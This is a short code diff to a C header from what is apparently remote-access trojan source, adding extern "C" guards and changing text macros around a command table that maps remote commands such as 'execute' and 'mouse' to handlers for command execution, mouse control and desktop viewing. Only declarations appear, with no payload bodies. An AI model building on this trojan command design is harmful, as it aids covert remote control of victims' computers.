@@ -42,16 +42,24 @@ typedef struct
 	trojan_task task;
 } MAP;
 
+#ifdef __cplusplus
+extern "C" {
+#endif /* __cplusplus */
+
 VOID _on_task_MESSAGEBOX(CONST PVOID args, PTCHAR result);
 VOID _on_task_VIEWDESKTOP(CONST PVOID args, PTCHAR result);
 VOID _on_task_MOUSECTRL(CONST PVOID args, PTCHAR result);
 VOID _on_task_EXECUTECMD(CONST PVOID args, PTCHAR result);
 
+#ifdef __cplusplus
+} // extern "C"
+#endif /* __cplusplus */
+
 static CONST MAP MAP_COMMANDS[NUMBER_OF_COMMANDS] =
 {
-	{ { TEXT("message"), MESSAGEBOX }, _on_task_MESSAGEBOX },
-	{ { TEXT("mouse"  ), MOUSECTRL  }, _on_task_MOUSECTRL  },
-	{ { TEXT("execute"), EXECUTECMD }, _on_task_EXECUTECMD }
+	{ { TEXTH("message"), MESSAGEBOX }, _on_task_MESSAGEBOX },
+	{ { TEXTH("mouse"  ), MOUSECTRL  }, _on_task_MOUSECTRL  },
+	{ { TEXTH("execute"), EXECUTECMD }, _on_task_EXECUTECMD }
 };
 
 INT          cmd2code(CONST PTCHAR cmd);
